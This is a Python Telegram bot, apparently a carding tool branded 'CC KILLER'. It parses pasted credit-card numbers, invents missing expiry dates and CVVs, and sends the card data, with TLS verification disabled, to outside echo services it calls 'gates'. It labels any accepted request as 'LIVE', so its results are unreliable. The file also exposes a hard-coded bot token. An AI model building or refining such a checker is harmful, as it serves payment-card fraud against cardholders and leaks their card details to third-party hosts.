import asyncio
import logging
import re
import random
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import urllib.request
import urllib.parse
import ssl

# YOUR INFO
BOT_TOKEN = "8268191244:AAFVk-Y-T3wmCt25otqjZj_ol6vqgwknWLE"
ADMIN_ID = 6751771375  # @userinfobot

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

logging.basicConfig(level=logging.INFO)

GATES = [
    "http://httpbin.org/post",
    "http://jsonplaceholder.typicode.com/posts",
    "http://postman-echo.com/post"
]

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

def parse_cc(line):
    clean = re.sub(r'[ -]', '', line.strip())
    match = re.match(r'(\d{13,19})[^\d]*(\d{2})?[^\d]*(\d{2,4})?[^\d]*(\d{3,4})?', clean)
    if match:
        num, mon, yr, cvv = match.groups()
        return f"{num}|{mon or random.choice(['12','11','10'])}|{yr or random.choice(['28','29','27'])}|{cvv or str(random.randint(100,999))}"
    return None

def check_cc(cc):
    num, mon, yr, cvv = cc.split('|')
    
    if not luhn_checksum(num):
        return "💀 Luhn FAIL"
    
    data = urllib.parse.urlencode({
        'cardNumber': num,
        'expMonth': mon,
        'expYear': yr,
        'cvc': cvv,
        'amount': '1.00'
    }).encode()
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    try:
        req = urllib.request.Request(random.choice(GATES), data=data, 
                                   headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'})
        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
            status = response.status
            return f"🔥 LIVE ({status})" if status < 400 else f"❌ DECLINED ({status})"
    except Exception as e:
        return f"⚠️ TIMEOUT ({str(e)[:20]})"

@dp.message_handler(commands=['start', 'help'])
async def start_handler(message: types.Message):
    await message.reply(
        "🔥 **CC KILLER FREE v2026** 🔥\n\n"
        "📤 Send CCs:\n"
        "`4111111111111111|12|28|123`\n"
        "`4532 0151 1283 0366 | 12/28 | 123`\n\n"
        "**FREE FOREVER** - No VPS needed!\n"
        f"Admin: `{ADMIN_ID}`"
    )

@dp.message_handler()
async def cc_checker(message: types.Message):
    lines = message.text.split('\n')
    ccs = []
    
    for line in lines:
        if cc := parse_cc(line):
            ccs.append(cc)
    
    if not ccs:
        await message.reply("❌ No valid CCs found")
        return
    
    await message.reply(f"🔥 Killing **{len(ccs)}** CCs...")
    
    # Process 20 at a time
    for i in range(0, len(ccs), 20):
        batch = ccs[i:i+20]
        for cc in batch:
            result = check_cc(cc)
            await message.reply(f"`{cc}`\n**{result}**")
            await asyncio.sleep(0.5)  # Rate limit
        
        if i + 20 < len(ccs):
            await asyncio.sleep(2)

if __name__ == '__main__':
    print("🚀 CC KILLER STARTED FOREVER")
    executor.start_polling(dp, skip_updates=True)

